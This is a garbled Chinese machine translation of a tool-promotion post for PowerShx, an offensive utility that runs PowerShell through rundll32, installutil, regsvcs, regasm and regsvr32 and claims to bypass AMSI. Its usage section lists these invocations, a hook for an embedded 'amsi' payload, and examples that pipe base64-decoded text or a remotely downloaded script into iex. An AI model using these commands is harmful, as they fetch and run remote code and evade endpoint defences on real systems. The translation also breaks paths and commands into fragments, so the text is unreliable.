# PowerShx:不受软件限制地运行 Powershell

> 原文：<https://kalilinuxtutorials.com/powershx-2/>

[![](img/8c0cd5a8ed1f3a1a2e89dcfe0ebbebd6.png)](https://blogger.googleusercontent.com/img/a/AVvXsEhsVH5qw1nRdrMZBuPN3nRiI3spAMlE0n7BnSJg6zERW6rhEaKfJ9dglHJCUKUiWh8QBgCopLI25ZSTNoIpkVEhuRMdsA2oREe_m_N8hBj6hYK6tGyc0FwmPy4SpRiTCk7PthXK5gTXHLi4iF1U1OuUqxG_wIwOk6GQw_EES4JrsyzdQ8nPfyl6uXcS=s978)

**PowerShx** 是对 PowerShdll 项目的重写和扩展。PowerShx 提供了绕过 AMSI 和运行 PS Cmdlets 的功能。

**特色**

*   使用 rundll32.exe、installutil.exe、regsvcs.exe 或 regsvr32.exe regasm.exe 运行带有 dll 的 Powershell。
*   不使用 powershell.exe 或 powershell_ise.exe 运行 Powershell
*   AMSI 旁路功能。
*   直接从命令行或 Powershell 文件运行 Powershell 脚本
*   导入 Powershell 模块并执行 Powershell Cmdlets。

**用法**

T1。dll 版本

**rundll32**

**rundll32 PowerShx.dll，main -e
rundll32 PowerShx.dll，main -f 运行作为参数传递的脚本
rundll32 PowerShx.dll，main -f -c 加载脚本并运行 PS cmdlet
rundll32 powershx . dll，main -w 在新窗口中启动交互控制台
rundll32 PowerShx.dll，main -i 启动交互控制台
rundll32 PowerShx**

**备选方案(这些技术的分包商的信用):**

*   **x86–C:\ Windows \ Microsoft。NET \ Framework \ v 4 . 0 . 30319 \ installutil . exe/log file =/logto console = false/U PowerShx.dll
    x64–C:\ Windows \ Microsoft。NET \ framework 64 \ v 4 . 0 . 3031964 \ installutil . exe/log file =/logto console = false/U PowerShx.dll**
*   **x86 C:\Windows\Microsoft。NET \ Framework \ v 4 . 0 . 30319 \ regsvcs . exe PowerShx.dll
    x64c:\ Windows \ Microsoft。PowerShx.dll**
*   **x86 C:\Windows\Microsoft。NET \ Framework \ v 4 . 0 . 30319 \ regasm . exe/U PowerShx.dll
    x64 C:\ Windows \ Microsoft。NET \ framework 64 \ v 4 . 0 . 30319 \ regasm . exe/U PowerShx.dll**
*   **regsvr 32/s/u PowerShx.dll—>调用 DllUnregisterServer
    regsvr 32/s PowerShx.dll—>调用 DllRegisterServer**

**。exe 版本**

**PowerShx.exe-我启动一个交互控制台
PowerShx.exe-e
PowerShx.exe-f 运行作为参数传递的脚本
PowerShx.exe-f-c 加载一个脚本并运行一个 PS cmdlet
PowerShx.exe-s 试图绕过 AMSI。**

**嵌入式有效载荷**

可以通过更新数据字典“Common”来嵌入有效载荷。Payloads.PayloadDict”并在方法 PsSession.cs -> Handle()中调用它。示例:在 Handle()方法中:

**私有 void 句柄(Options 选项)
{
//用户脚本前预执行
_ps。有效负载。payload dict[" amsi "])；
}**

**例题**

**运行 base64 编码的脚本**

**rundll32 PowerShx.dll，main[系统。Text.Encoding]::默认。GetString([System。convert]::from base64 string(" base64 "))PowerShx.exe ^| iex
e【系统。Text.Encoding]::默认。GetString([System。convert]::from base64 str**I**ng(" base64 "))^|**iex

**注意:**帝国 stagers 需要使用【System。Text.Encoding]::Unicode

**运行 base64 编码的脚本**

**rundll32 PowerShx.dll，main。{ iwr-useb https://website.com/Script.ps1 } ^| iex；
PowerShx.exe-e”IEX((new-object net . webclient)。download string(' http://192 . 168 . 100/payload-http ')"**

**要求**

。网络 4

[**Download**](https://github.com/iomoath/PowerShx)